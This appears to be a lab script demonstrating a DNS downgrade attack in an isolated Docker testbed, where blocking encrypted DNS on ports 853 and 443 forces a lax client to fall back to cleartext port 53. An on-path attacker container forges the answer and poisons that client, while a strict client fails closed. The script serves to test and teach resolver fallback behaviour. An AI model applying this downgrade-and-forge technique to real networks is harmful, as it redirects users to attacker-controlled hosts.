#!/bin/sh
# Attempt (iii): deny the encrypted transport (block TCP 853/443) to force a
# cleartext fallback, then forge on :53 with the on-path attacker. The strict
# client fails closed; the lax client falls back to cleartext and is poisoned.
cd "$(dirname "$0")/.."
echo "== block the encrypted transport and forge cleartext :53 =="
VICTIM=172.16.1.10 MODE=forge docker compose up -d attacker >/dev/null 2>&1
sh scripts/net.sh block >/dev/null
sh scripts/net.sh divert >/dev/null
docker exec resolver rndc flush >/dev/null 2>&1 || true
sleep 2

echo "-- strict client (no cleartext fallback) --"
docker exec client sh /opt/bin/resolve-strict.sh example.com 2>&1 | grep -iE "status:|IN[[:space:]]+A|WARNING|failed|refused|timed out" | head -2
echo "   expected: DoT blocked, no answer. Fails closed (denial of service, not poison)."

echo "-- lax client (permits cleartext when the encrypted transport is down) --"
docker exec client sh /opt/bin/resolve-lax.sh example.com 2>&1 | grep -iE "falling back|transport|IN[[:space:]]+A[[:space:]]|status:" | head -3
printf '   lax client fetch -> '
docker exec client sh -c 'curl -s --resolve example.com:80:$(kdig +short @172.16.2.10 example.com A | tail -1) http://example.com 2>/dev/null | grep -ioE "hacked|welcome" | head -1' || true

sh scripts/net.sh unblock >/dev/null
sh scripts/net.sh undivert >/dev/null
echo "RESULT: strict fails closed; lax is downgraded to :53 and poisoned to 172.16.1.30."
